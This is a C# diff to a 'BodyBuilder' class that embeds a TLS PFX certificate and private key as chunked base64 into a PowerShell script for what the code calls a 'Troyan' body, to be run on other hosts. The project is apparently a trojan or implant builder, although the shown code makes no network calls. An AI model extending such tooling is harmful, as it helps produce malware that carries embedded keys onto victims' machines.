@@ -16,7 +16,44 @@ public sealed class BodyBuilder : CustomBuilder
 
     protected override void InternalBuild(string server)
     {
+        MakeCert();
         MakeEmbeddings();
+    }
+
+    /// <summary>Writes <c>consts_cert.ps1</c> with the LAN TLS PFX as chunked base64. Reads from <see cref="ServerLayoutPaths.UserDataTlsPfx"/> (staged beside <c>server.json</c>) so the shipped body is self-contained for execution on other hosts.</summary>
+    private void MakeCert()
+    {
+        var template = @"
+
+        $xdata = @{
+        _CERT
+    }
+        
+";
+
+        var pathPfx = L.UserDataTlsPfx;
+        if (!File.Exists(pathPfx))
+            throw new FileNotFoundException(
+                $"TLS PFX not found for Troyan embed. Run CertTool (Hephaestus data cert) or copy the PFX next to server.json as: {Path.GetFileName(pathPfx)}. Expected path: {pathPfx}",
+                pathPfx);
+
+        var binaryData = File.ReadAllBytes(pathPfx);
+        var base64 = CustomCryptor.EncodeBytes(binaryData);
+        const int chunkSize = 200;
+        var chunks = new List<string>();
+
+        for (var i = 0; i < base64.Length; i += chunkSize)
+        {
+            var chunk = base64.Substring(i, Math.Min(chunkSize, base64.Length - i));
+            chunks.Add(chunk);
+        }
+
+        var code = "'" + string.Join("'+" + Environment.NewLine + "'", chunks) + "'";
+        var listString = "'Hephaestus'=" + code;
+        template = template.Replace("_CERT", listString);
+
+        var outputPath = Path.Combine(L.TroyanScriptDir, "consts_cert.ps1");
+        File.WriteAllText(outputPath, template);
     }
 
     private void MakeEmbeddings()
